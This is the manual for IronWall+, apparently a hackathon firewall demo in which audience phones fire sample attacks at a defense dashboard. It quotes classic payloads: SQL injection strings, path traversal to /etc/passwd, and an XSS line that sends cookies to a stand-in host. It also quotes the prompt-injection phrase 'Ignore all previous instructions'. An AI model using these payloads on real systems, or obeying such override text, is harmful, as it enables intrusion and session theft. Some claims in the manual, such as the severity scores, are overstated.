# ⚡ IronWall+ — Complete Manual
### IronWall+ v2.0 | Gamethon 2026 Edition
---

## Table of Contents

1. [What is IronWall+?](#1-what-is-ironwall)
2. [System Architecture](#2-system-architecture)
3. [How to Start the System](#3-how-to-start-the-system)
4. [The Defense Grid (index.html)](#4-the-defense-grid)
5. [The Attacker Control Panel (attacker.html)](#5-the-attacker-control-panel)
6. [All Attack Buttons — Explained](#6-all-attack-buttons--explained)
7. [All Informational Threat Intel Buttons](#7-all-informational-threat-intel-buttons)
8. [The AI Debrief Panel](#8-the-ai-debrief-panel)
9. [The Ouroboros Evolution Engine](#9-the-ouroboros-evolution-engine)
10. [The Tartarus Honeypot (Mirror Dimension)](#10-the-tartarus-honeypot-mirror-dimension)
11. [The Hacker Progression System](#11-the-hacker-progression-system)
12. [Vulnerability Patch Quizzes](#12-vulnerability-patch-quizzes)
13. [The Phishing Simulator (Human Factor Event)](#13-the-phishing-simulator-human-factor-event)
14. [Payload X-Ray Modal](#14-payload-x-ray-modal)
15. [Demo Mode (demo.html)](#15-demo-mode-demohtml)
16. [Voice Announcer (TTS)](#16-voice-announcer-tts)
17. [Screen Recording](#17-screen-recording)
18. [Glossary of Technology](#18-glossary-of-technology)

---

## 1. What is IronWall+?

**IronWall+** is a real-time, interactive Web Application Firewall (WAF) demonstration built for the Gamethon 2026 hackathon. It is **not** a toy simulation — the attack-to-defense communication is driven by a real **Rust-powered backend server** running the Cloudflare Pingora framework, and real WebSocket connections are used to send, receive, and display live attack telemetry.

### What problem does it solve?
Traditional security demos are boring slides. **IronWall+ makes cybersecurity visceral and interactive.** Any person in the audience can take out their phone, navigate to the attacker panel, and fire a real SQL Injection payload at the defense core — and they can watch it get blocked in real time on the projector screen.

### Key Design Pillars
| Pillar | What it means |
|---|---|
| **Real Backend** | Rust + Pingora WAF, not just a UI mock |
| **Real WebSockets** | Attacks travel over a live WS connection |
| **Educational** | Each attack comes with an explanation, a payload view, and a code fix |
| **Interactive** | Mobile-first attacker panel any guest can use |
| **Cinematic** | WebGL glitch shaders, screen shake, CyberSynth audio, TTS voice |

---

## 2. System Architecture

```
┌───────────────────┐       WebSocket (ws://localhost:9001/ws)
│  ATTACKER PANEL   │ ─────────────────────────────────────────────────►  ┌──────────────────────┐
│  attacker.html    │                                                       │                      │
│  attacker.js      │                                                       │  RUST BACKEND SERVER │
└───────────────────┘                                                       │  (Pingora WAF)       │
                                                                            │  backend/src/main.rs │
┌───────────────────┐       WebSocket (ws://localhost:9001/ws)              │                      │
│  DEFENSE GRID     │ ◄─────────────────────────────────────────────────   │  Port: 9001          │
│  index.html       │                                                       └──────────────────────┘
│  game.js          │
└───────────────────┘

Both panels connect to the SAME WebSocket server.
Attacker sends an attack event → Backend receives it → Backend broadcasts
a BLOCKED event back to ALL connected clients → Defense Grid displays it.
```

### Files & Their Purpose

| File | Role |
|---|---|
| `frontend/index.html` | Defense Grid HTML structure |
| `frontend/game.js` | Defense Grid logic: canvas, WebSockets, AI debrief, HUD |
| `frontend/attacker.html` | Attacker Control Panel HTML structure |
| `frontend/attacker.js` | Attacker logic: modals, firing, WebSockets, TTS |
| `frontend/style.css` | All styling for both panels |
| `frontend/demo.html` | Split-screen demo mode layout |
| `frontend/recorder.js` | Browser screen recording (MediaRecorder API) |
| `frontend/serve.js` | Node.js static file server (port 3000) |
| `backend/src/main.rs` | Rust backend: WebSocket relay + WAF detection |
| `start.bat` | One-click launcher for both servers |

---

## 3. How to Access the Live Demo

The fastest way to experience IronWall+ is via our live cloud deployment on Render. No installation or local compilation is required!

### Target URLs
| URL | What you see |
|---|---|
| `https://ironwall-frontend.onrender.com` | Defense Grid (project this on the main screen) |
| `https://ironwall-frontend.onrender.com/attacker.html` | Attacker Control Panel (open this on phones) |
| `https://ironwall-frontend.onrender.com/demo.html` | Split-screen demo mode |

### Mobile Access
Judges can simply navigate to `https://ironwall-frontend.onrender.com/attacker.html` on their mobile browsers using regular 4G/5G data. They do *not* need to be on the same Wi-Fi network.

### Local Development Start (Optional)
If you wish to run the full Rust stack locally instead of using the cloud version:
1. Double-click `start.bat` to launch both the Node.js frontend server (Port 3000) and the Rust backend proxy (Port 9001/8080).
2. Access locally via `http://localhost:3000`.

---

## 4. The Defense Grid

**File:** `frontend/index.html` + `frontend/game.js`

This is the main screen you project to your audience. It's a real-time cyberpunk dashboard that shows every attack as it happens.

### Header Bar (Top)
From left to right:
- **⚡ IRONWALL+ Logo** — Project identity
- **DEFENSE GRID ACTIVE** (green dot) — Shows the system is operational
- **🔊 VOICE: OFF/ON** — Toggles the AI Voice Announcer (TTS engine)
- **⏺ REC** — Starts/stops browser screen recording
- **WS Status** — Shows live WebSocket connection state (`CONNECTING...`, `CONNECTED`, `NO SERVER`)

### Network Topology Diagram
The animated SVG bar at the top shows the path of a network packet:
`INTERNET → PINGORA (WAF) → RUST CORE → SECURE APP`

When you fire an attack, a coloured dot animates along this path — **red** for a threat, **cyan** for a safe packet.

### Canvas Arena (Center)
A full `<canvas>` element rendered at 60 FPS using JavaScript. Features:
- **Rotating hexagonal Core Server** — the asset being defended. Glows cyan (safe) or red (under attack).
- **Packet orbs** — red orbs fly in from random directions when an attack fires. When they hit the core, they explode in particles.
- **WebGL Glitch Shader** — a second `<canvas>` overlaid on top renders an RGB chromatic aberration scanline glitch effect using WebGL shaders. Intensity spikes on every attack, then fades away.
- **Screen Shake** — on a threat hit, the camera physically shakes.
- **Star field background** — twinkling cyan star particles behind everything.

### Threat Log (Bottom Left)
A live log that shows the last 8 events, each line formatted as:
`🔴 ATTACK_TYPE · origin_ip · block_speed_ns`

### Combo Meter (Top center of HUD)
When multiple attacks are blocked in quick succession, a `x2`, `x3` etc. multiplier appears, rewarding rapid attack sequences.

### HUD (Bottom strip)
Shows live stats: **Threats Neutralized**, **Compute Saved (ms)**, **System Uptime**, and a live **Threat Level** bar that spikes on each attack and slowly decays.

### Glossary Panel (Bottom Right)
A `[?]` button reveals a slide-out **Cyber-Wiki** panel that defines the key technical terms used by IronWall+ (eBPF, WAF, AST, Ouroboros, Tartarus, etc.).

---

## 5. The Attacker Control Panel

**File:** `frontend/attacker.html` + `frontend/attacker.js`

This is the **Red Team Command Room**. Think of it as a hacker's terminal interface. It is designed to be used on both desktop and mobile phones.

### Header Bar (Top)
- **🎯 RED TEAM COMMAND ROOM** — Identity
- **Attacks Fired** — Live count of attacks launched this session
- **Combo x N** — Combo multiplier display
- **⏺ REC** — Screen recording button
- **Status Bar** — Shows connection status to the backend WebSocket

### Attack Button Grid
The main area is a grid of attack buttons divided into two categories:
1. **Live Fire Buttons** *(colored, glow on hover)* — These connect to the backend and trigger a visual event on the defense grid.
2. **Threat Intel Buttons** *(grey/muted, labeled "TARGET: ...")* — These open an informational popup only. They cannot be fired because these attacks (ransomware, zero-click exploits) cannot be meaningfully simulated in a browser demo.

### Blast Radius Simulator
When you **hover** over any live fire button on desktop, a floating panel appears on the right showing the real-world impact of that attack (e.g., "User identity stolen via malicious URL. Attacker impersonates the victim.").

### Tech Stack Panel
A strip of badges at the bottom of the grid displaying the underlying technologies powering IronWall+ (Rust, Pingora, eBPF, Phi-3 LLM, WebAssembly, Ouroboros, Chitchat P2P, TPM 2.0).

### Manual Payload Entry
At the bottom of the panel, there is a text input where technically-advanced presenters can **type any custom payload string** (e.g., `<script>alert(1)</script>`) and fire it manually. IronWall+ will auto-detect the attack type and send it.

---

## 6. All Attack Buttons — Explained

These are the **Live Fire** buttons that actually send data to the backend and trigger the defense grid.

### 🗡️ SQL: TAUTOLOGY
- **What it does**: Sends `' OR '1'='1 --` as the payload to the backend.
- **The Attack**: A classic SQL Injection. The single quote `'` escapes the intended SQL string, and `OR '1'='1'` makes the query's `WHERE` clause *always true*, bypassing login authentication.
- **Severity**: 850 / 100

### 🔗 SQL: UNION-BASED
- **What it does**: Sends `UNION SELECT username, password FROM users --`
- **The Attack**: UNION-based SQLi "stacks" a second query onto the original one to extract data from a completely different database table (e.g., the users table).
- **Severity**: 900 / 100

### ⏱ SQL: BLIND/TIME
- **What it does**: Sends `' OR IF(1=1, SLEEP(5), 0) --`
- **The Attack**: In "Time-based Blind" SQLi, the attacker doesn't see any data directly. Instead, they ask the database true/false questions: *"Does the first character of the admin password start with 'A'?"* If the site takes 5 seconds to respond (due to `SLEEP(5)`), the answer is yes.
- **Severity**: 820 / 100

### 🕸️ XSS: REFLECTED
- **What it does**: Sends `<script>document.location='https://evil.io/steal?c='+document.cookie</script>`
- **The Attack**: Reflected XSS injects a script into a URL. If a victim is tricked into clicking that crafted URL, the malicious script runs in their browser and steals their session cookie, allowing the attacker to impersonate them.
- **Severity**: 800 / 100

### 💾 XSS: STORED
- **What it does**: Sends `<img src=x onerror='alert("XSS Stored")'>`
- **The Attack**: Unlike reflected XSS (which requires a special URL), Stored XSS saves the malicious payload on the server (e.g., in a comment field). Every single user who visits that page then automatically executes the script — making it a "worm" attack.
- **Severity**: 950 / 100

### 📂 PT: LINUX ROOT
- **What it does**: Sends `../../../../etc/passwd`
- **The Attack**: Path Traversal (also known as Directory Traversal) uses `../` sequences to "climb up" out of the intended web root directory and access sensitive system files like `/etc/passwd` which contains Linux user account names.
- **Severity**: 750 / 100

### 🪟 PT: WINDOWS SYS
- **What it does**: Sends `..\..\..\windows\win.ini`
- **The Attack**: Same as Linux Path Traversal, but targeting Windows servers. `win.ini` is an old Windows configuration file that reveals system details and can be the first step in a privilege escalation attack.
- **Severity**: 750 / 100

### 🌊 DDoS: SYN FLOOD
- **What it does**: Sends `SYN_FLOOD :: 120Gbps` as the payload (simulating volumetric traffic).
- **The Attack**: A SYN Flood exploits the TCP handshake. Normally, a connection starts with SYN → SYN-ACK → ACK. The attacker sends millions of SYN packets from fake IPs but never sends the final ACK. The server holds open a "half-open" connection for each one, exhausting its connection table until it can't accept any more real users.
- **Severity**: 950 / 100

### ⚡ DDoS: UDP AMP
- **What it does**: Sends `UDP_AMPLIFICATION :: DNS:x173`.
- **The Attack**: UDP Amplification uses open DNS/NTP servers as "amplifiers." The attacker sends a tiny request (50 bytes) to thousands of servers with a spoofed source IP (the victim's IP). Each server responds with a huge packet (8,500 bytes) to the victim. Net result: 173x amplification of the attacker's bandwidth.
- **Severity**: 980 / 100

### 🧬 ZERO-DAY
- **What it does**: Fires a polymorphic XOR shellcode payload.
- **The Attack**: A zero-day exploit is an attack for which no patch exists yet. This button simulates a **polymorphic** exploit — one that changes its byte signature on every execution to evade standard antivirus scanners that rely on known-bad signatures.
- **Special Effect**: After being blocked, this attack triggers the **Ouroboros Evolution Engine** on the defense panel, showing the AI automatically generating a WASM patch to block future variants.
- **Severity**: 99 / 100

### 🪞 MIRROR PROBE
- **What it does**: Simulates a persistent probe from the same IP address.
- **The Attack**: A highly sophisticated attacker conducts reconnaissance before striking — probing for vulnerabilities, open ports, and misconfigured endpoints. After multiple blocks from the same source, IronWall+'s Tartarus Engine kicks in.
- **Special Effect**: After being blocked, this triggers the **Mirror Dimension Honeypot** on both panels, routing the attacker to a fake environment.
- **Severity**: 60 / 100

### 📧 PHISHING
- **What it does**: Opens the Phishing Simulator — a 2-step interactive module.
- **The Attack**: Opens a special modal where you choose a subject line (urgency bait) and a malicious link. Then a simulation animates a "company employee" receiving the email, hovering over the link, and clicking it. Even though the user clicked, IronWall+ detects the C2 callback beacon and severs the connection.
- **Key Lesson**: No firewall can stop a human from clicking a link. MFA + security training are the only real defenses.

---

## 7. All Informational Threat Intel Buttons

These buttons are **grey/muted** and open an informational popup only. They cannot fire at the server because these attacks cannot be meaningfully simulated in a browser context.

| Button | Attack Type | Key Point |
|---|---|---|
| 💉 PROMPT INJECT | AI/LLM Jailbreak | "Ignore all previous instructions" — overrides an AI's safety guardrails. Only relevant against AI-powered systems. |
| 🔑 PRIV ESCALATE | Windows/Linux UAC bypass | Running malicious DLLs to gain full SYSTEM/root privileges from a normal user account. |
| 📦 SUPPLY CHAIN | NPM/PyPI package compromise | Poisoning a trusted 3rd-party library so thousands of companies import malware during their routine builds. |
| 🔒 RANSOMWARE | AES-256 file encryption | Encrypts all data on a domain controller. Defenses: immutable backups + Zero Trust. |
| 🎭 CSRF FORGERY | Session-based forged requests | `<img>` tag that silently triggers a bank transfer from a logged-in victim's browser. |
| 🗝️ PASSWORD SPRAY | Credential stuffing | Trying one common password against 10,000 accounts to avoid lockout detection. |
| 👻 ZERO-CLICK | OS-level silent exploit | Exploits image/video parsing libraries with no user interaction needed. Nation-state grade threat. |

Click the **🔊 PLAY** button inside the popup to hear a voice explanation of the attack!

---

## 8. The AI Debrief Panel

**Triggered by**: Every live-fire attack that is blocked by the backend.

A panel slides in from the right side of the Defense Grid screen. It contains:
1. **Title** — e.g., `Attack Neutralized — SQL Injection Blocked.`
2. **Typewriter Body** — A detailed technical explanation of how IronWall+ detected and blocked this specific attack, including latency figures (e.g., "540ns").
3. **Suspected Threat Actor** — A randomly chosen fictional nation-state threat actor (e.g., "Ghost Shell", "Neon Wraith") with their suspected tactic.
4. **[TECHNICAL DEEP DIVE]** link — Clicking this opens the **Code Fix Modal**, a side-by-side comparison of the vulnerable code pattern vs. the secure IronWall+ implementation.

The panel auto-dismisses after 20 seconds.

---

## 9. The Ouroboros Evolution Engine

**Triggered by**: The **Zero-Day** button, and the **Mirror Probe** button (after a short delay).

The Ouroboros panel overrides the AI Debrief panel with a dramatic multi-step animation showing the AI's self-evolution cycle:

```
Step 1: Mutating collected attack variants in isolation sandbox...
Step 2: Identifying detection gap: comment-based SQL evasion (/**/)...
Step 3: Phi-3 LLM generating virtual patch suggestion...
Step 4: Ghost Engine compiling Wasm module: comment_stripper_v2.wasm...
Step 5: Patch deployed. All future comment-evasion variants: BLOCKED.
Step 6: Evo Points +10 | Detection Coverage: 97.4% → 98.1%
```

**Why it's impressive**: It shows IronWall+ is not just reactive (blocking known attacks) but *proactive* (using AI to discover and patch new attack variants autonomously).

---

## 10. The Tartarus Honeypot (Mirror Dimension)

**Triggered by**: The **Mirror Probe** button.

The Tartarus Engine is IronWall+'s deception layer. When a persistent attacker is detected (multiple blocks from the same IP), instead of just blocking them, IronWall+ **routes them to an entirely fake infrastructure**.

On the Attacker panel, a special "MIRROR DIMENSION" popup appears, showing the attacker a convincing fake terminal as if they've broken in. On the Defense Grid, the AI Debrief announces the honeypot activation.

**Key lesson for judges**: Honeypots don't just stop attacks — they turn attackers into unwitting intelligence sources. This is how nation-states study attacker TTPs (Tactics, Techniques & Procedures).

---

## 11. The Hacker Progression System

**Location**: The Attacker Control Panel

To encourage active participation, the Attacker Panel features an RPG-like leveling system. Users begin at **Level 1** (Rank: "Script Kiddie") and only have access to basic SQL Injection attacks.

As the user successfully fires payloads at the firewall (navigating the Payload X-Ray), they earn **EXP** (Experience Points) and build up a combo multiplier. Hitting specific EXP thresholds automatically triggers a visual Level-Up sequence, unlocking advanced tiers of attacks like XSS, Path Traversal, and eventually Zero-Days.

---

## 12. Vulnerability Patch Quizzes

**Location**: The Defense Grid

IronWall+ is not just about blocking attacks; it's about teaching secure coding. When an attack type (e.g., SQL Injection) is intercepted by the WAF for the very first time, an **"ACTIVE THREAT BLOCKED"** modal physically interrupts the Defense Grid.

The simulation asks the audience a multiple-choice question: *"How do we patch the root vulnerability in the application layer?"*
- Selecting the correct secure practice (e.g., "Parameterized Queries") grants a massive Bonus EXP reward.
- Selecting the wrong answer penalizes the system by artificially spiking the Threat Level.

---

## 13. The Phishing Simulator (Human Factor Event)

**Triggered by**: A randomized timer on the Defense Grid.

No firewall can stop a user from clicking a malicious link. To demonstrate the "Human Factor," IronWall+ features a random event where a simulated **company email client** slides onto the screen.

The presenter (or audience) has a few seconds to evaluate the email:
- Is the sender legitimate? (e.g., `hr@ironwall.com` vs `it-support@lronwall.com` with a lowercase L).
- If it's **Phishing**, the user must click **[Report to IT]**.
- If it's **Legitimate**, the user clicks **[Open Link]**.

If a user mistakenly clicks the link on a phishing email, the entire Defense Grid flashes red, shakes violently, and declares **SYSTEM COMPROMISED**, proving that human security awareness is the ultimate firewall.

---

## 14. Payload X-Ray Modal

**Opens when**: You click any Live Fire button (SQL, XSS, Path Traversal, DDoS, Zero-Day).

This modal has three sections:

1. **PAYLOAD CODE** — The raw, actual malicious payload string rendered as code. The specific dangerous token is highlighted (e.g., `SLEEP(5)` in red).
2. **LESSON BOX** — A 1-2 sentence plain-English explanation of what this payload does and why it is dangerous.
3. **FIRING MECHANISM**:
   - **Desktop**: Drag the "PAYLOAD CHIP" card and drop it into the "FIRING CHAMBER" to arm and fire the attack. This is intentional — it makes firing feel deliberate and dramatic.
   - **Mobile**: Tap the payload chip, then tap the firing chamber to fire.
4. **🔊 PLAY button**: Reads the attack name and lesson text aloud using the Voice Announcer.

---

## 15. Demo Mode (demo.html)

**URL**: `http://localhost:3000/demo.html`

This is the **recommended view for presentations**. It shows both panels simultaneously on one screen using HTML `<iframe>` elements:

- **Left 75%**: The full Defense Grid (index.html)
- **Right 25%**: A simulated phone frame showing the Attacker Panel (attacker.html), labeled "MOBILE CONTROLLER SIMULATION"

### HIDE/SHOW Controller Button
A button in the top-right corner toggles the attacker panel visibility. When hidden, the Defense Grid expands to fill the full screen — great for "only showing the results" phase of a presentation.

---

## 16. Voice Announcer (TTS)

**Technology**: Browser-native `window.speechSynthesis` API.

The entire feature works without any external dependencies or API keys.

### On the Defense Grid
- The **🔊 VOICE: OFF** button in the top header toggles the announcer.
- When **ON**, every blocked attack triggers a spoken announcement: *"Warning. SQL Injection detected. Attack neutralized."*
- The voice automatically selects the best available English Google voice. If unavailable, it falls back to any available English voice.

### On the Attacker Panel
- **Payload X-Ray Modal**: A 🔊 PLAY button reads the attack type and the lesson text.
- **Threat Intel Modal**: A 🔊 PLAY button reads the attack vector description and the mitigation strategy — perfect for educational presentations when you want the AI to explain an attack while you talk over it.
- When a modal is closed, the voice automatically stops speaking.

---

## 17. Screen Recording

**Technology**: Browser-native `navigator.mediaDevices.getDisplayMedia()` API.

### How to Record
1. Click the **⏺ REC** button in the header of either panel.
2. Your browser will ask you to choose what to share (a browser tab, an entire window, or the full screen). Select the appropriate option.
3. The button changes to a pulsing red **■ STOP REC** indicator, showing recording is active.
4. Click **■ STOP REC** to stop. The recording immediately downloads as a `.webm` video file to your Downloads folder.

> **Tip**: You can open any video player (VLC, Chrome, etc.) to play `.webm` files. They can also be converted to `.mp4` using a free tool like HandBrake.

---

## 18. The IronWall+ AI Consultant (Phi-3)

The Gamethon demo includes a fully functional, offline Cybersecurity AI Consultant built directly into both the Defense Grid and the Mobile Attacker Panel. This demonstrates the integration of Cognitive AI for real-time threat analysis.

### How it Works
The AI interfaces with a Local Large Language Model (like **Phi-3**) running on the presenter's laptop. It uses standard OpenAI-compatible REST API endpoints to send system prompts and conversation history to the model, processing the response entirely offline (zero cloud latency, zero privacy risk). **No additional training is required**, as the system automatically injects a "Cyberpunk Defender" prompt natively via JavaScript before every query.

### Presentation Setup & Configuration

Because the AI runs locally on your laptop, **you must configure your local LLM server to accept connections from other devices on your Wi-Fi network** (like the judges' phones).

#### Option A: Using LM Studio (Recommended)
1. Open LM Studio and load your Phi-3 model.
2. Go to the **Local Server** tab (↔ icon).
3. On the right-side configuration panel, set **Server Port** to `1234`.
4. Check the box for **CORS (Cross-Origin Resource Sharing)**.
5. In the **Server Network** dropdown, select **Any (0.0.0.0)** instead of Localhost.
6. Click **Start Server**.

#### Option B: Using Ollama
By default, Ollama blocks external Wi-Fi requests for security. You must start it with environment variables granting network access.
1. Open Windows Command Prompt (`cmd`).
2. Run the following commands to bind Ollama to your local network:
   ```cmd
   set OLLAMA_HOST=0.0.0.0
   set OLLAMA_ORIGINS="*"
   ollama serve
   ```

#### ⚡ Connecting Multiple Devices (The Easy Way)
The newer **WiFi Bridge** system handles the networking automatically:
1. **Host**: Start the app on your laptop. Note the **LOBBY CODE** in the header.
2. **Share**: Click the **Share** icon next to the code to copy the join link.
3. **Join**: Open the link on the judge's phone (or enter the 4-digit code at `/lobby.html`).
4. **Result**: The AI Consultant and Attacker panels will automatically sync to your laptop's backend without any manual IP configuration!

---

## 19. Glossary of Technology

| Term | Explanation |
|---|---|
| **Rust** | A systems programming language that guarantees memory safety without a garbage collector. IronWall+ uses it for the backend because it is extremely fast (nanosecond latency) and cannot have memory corruption vulnerabilities (like buffer overflows) by design. |
| **Pingora** | An open-source, high-performance Layer 7 proxy framework built by Cloudflare and written in Rust. IronWall+ uses it as the WAF engine that inspects every incoming HTTP/WebSocket request. |
| **eBPF / XDP (Aegis Prime)** | Extended Berkeley Packet Filter. A technology that runs sandboxed programs inside the Linux kernel. IronWall+ uses it to drop malicious packets at the network interface card, *before* they even touch the operating system — achieving sub-microsecond blocking. |
| **WebSocket** | A persistent, two-way communication channel over a single TCP connection. Unlike standard HTTP (request → response), WebSockets allow the server to push data to connected clients at any time — which is how the backend instantly notifies the defense grid when an attack is blocked. |
| **Ouroboros Engine** | IronWall+'s Genetic AI subsystem. When it encounters a zero-day or novel attack, it mutates the payload in a safe sandbox, uses the on-device Phi-3 LLM to suggest a patch, and then compiles that patch into a WebAssembly module that is deployed live — all in seconds. |
| **Tartarus Engine** | IronWall+'s software-defined deception layer. Named after the Greek underworld prison. Instead of just blocking repeat attackers, it transparently routes them into a fake "Mirror Dimension" infrastructure — honeypot servers serving fake data — while logging all their techniques. |
| **Phi-3 LLM (Local)** | Microsoft's highly efficient small language model that runs entirely on-device (no cloud required). IronWall+ uses it to generate natural-language threat reports and suggest code patches for novel attack patterns. |
| **Ghost Engine (WASM)** | The WebAssembly patch compiler. When the Ouroboros Engine generates a new detection rule, the Ghost Engine compiles it into a tiny, sandboxed `.wasm` module that runs at near-native speed inside the Pingora proxy, extending its detection abilities in real time. |
| **Chitchat P2P** | A gossip protocol module built on top of IronWall+. When one IronWall+ node blocks a new IP, it "gossips" that IP to all its neighboring nodes, ensuring the blocklist propagates across the entire cluster in seconds without a central coordinator. |
| **TPM 2.0 Audit Chain** | Trusted Platform Module. IronWall+ logs every decision to a tamper-proof hardware audit chain using the TPM chip, ensuring that the forensic record of every block decision is cryptographically verifiable and cannot be altered even by a compromised administrator. |
| **WAF (Web Application Firewall)** | A security filter that sits between the internet and a web application. It inspects HTTP traffic to block common exploits like SQL Injection and XSS, which look like normal web requests to a regular firewall. |
| **AST (Abstract Syntax Tree)** | How a compiler "sees" code. Instead of just matching text patterns, IronWall+ parses SQL queries into an AST to determine if a string is legitimate data or a malicious command — defeating obfuscation techniques that fool regex-based WAFs. |
| **Zero Trust Architecture** | A security model that assumes no user or device is automatically trusted, even those inside the corporate network. "Never trust, always verify." Every access request requires re-authentication and minimal privilege — severely limiting what a attacker can do even after breaching the perimeter. |
| **SBOM (Software Bill of Materials)** | A formal, machine-readable inventory of all software components (including 3rd-party libraries and their versions) used in a system. Critical for detecting Supply Chain attacks where a dependency is secretly compromised. |
| **MFA / 2FA** | Multi-Factor Authentication. Requires users to prove their identity using two or more of: Something they KNOW (password), Something they HAVE (phone/hardware key), Something they ARE (biometrics). Defeats credential theft because knowing the password alone is not enough. |

---

*IronWall+ v2.0 — Gamethon 2026. Built with Rust, Pingora, WebSockets, WebGL, and the Web Speech API.*
